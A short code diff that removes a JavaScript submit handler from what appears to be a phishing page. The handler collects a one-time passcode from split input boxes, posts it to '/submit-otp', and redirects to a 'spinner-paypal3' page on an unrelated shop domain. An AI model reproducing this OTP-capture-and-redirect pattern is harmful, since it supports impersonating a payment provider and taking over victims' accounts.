@@ -32,37 +32,7 @@ document.addEventListener("DOMContentLoaded", function() {
         });
     });
 
-    // Event listener to prevent default form submission and to handle the AJAX submission
-    form.addEventListener('submit', function(e) {
-        e.preventDefault();
-
-        // Combine the values from each input
-        const otpValue = Array.from(otpInputs).map(input => input.value).join('');
-
-        // Adjust the fetch call according to your API
-        fetch('/submit-otp', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded'
-            },
-            body: `otp=${otpValue}`
-        })
-        .then(response => {
-            if (!response.ok) {
-                throw new Error('Network response was not ok');
-            }
-            return response.json(); // Assuming the response is JSON. Adjust if necessary.
-        })
-        .then(data => {
-            // Handle success - Redirecting to another page upon successful OTP submission
-            window.location.href = 'https://shop.smile-actives.co/spinner-paypal3.html'; // Adjust the URL as needed
-        })
-        .catch(error => {
-            // Handle errors here, such as showing an error message to the user
-            console.error('Error:', error);
-        });
-    });
-
+    
     // Assuming you have a way to get the OTP, you would call a function like this:
     // This is just an example and would need to be implemented according to your actual logic
     function autofillOtp(otp) {
